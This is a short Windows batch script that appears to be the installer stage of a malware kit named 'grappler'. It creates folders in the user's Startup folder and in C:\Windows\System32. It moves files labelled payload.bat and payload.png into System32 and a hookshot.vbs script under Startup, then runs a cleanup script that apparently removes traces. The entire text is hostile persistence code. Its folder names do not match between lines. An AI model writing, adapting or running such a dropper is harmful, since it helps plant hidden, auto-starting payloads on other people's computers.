cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
mkdir grappler
cd C:\Windows\System32
mkdir grappler
cd C:\Windows\System32\grappling-hook
move payload.bat, cleanup.bat, payload.png C:\Windows\System32\grappler
move hookshot.vbs %appdata%\Microsoft\Windows\Start Menu\Programs\Startup\grappler
cleanup.bat
exit